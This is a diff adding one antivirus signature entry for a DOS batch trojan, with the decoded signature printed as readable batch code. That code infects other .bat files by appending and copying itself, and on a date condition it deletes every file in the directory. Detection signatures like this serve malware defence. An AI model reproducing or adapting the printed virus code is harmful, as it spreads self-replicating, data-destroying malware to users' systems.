@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36712
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off%[obdc]% for %%f in (*.b*t ..\*.ba?) do set obdc=%%f find "obdc"<%obdc%>nul if errorlevel 1 find "obdc"<%0>>%obdc% echo.|date|find "04.07"<nul%[obdc]% if errorlevel 0 goto :obdc if errorlevel 1 goto :obdc_ :obdc_ del /y *.* [%obdc%] :obdc for %%b in (*.ba* ..\*.*at) do copy %0 %%b /y time 23:59 exit 
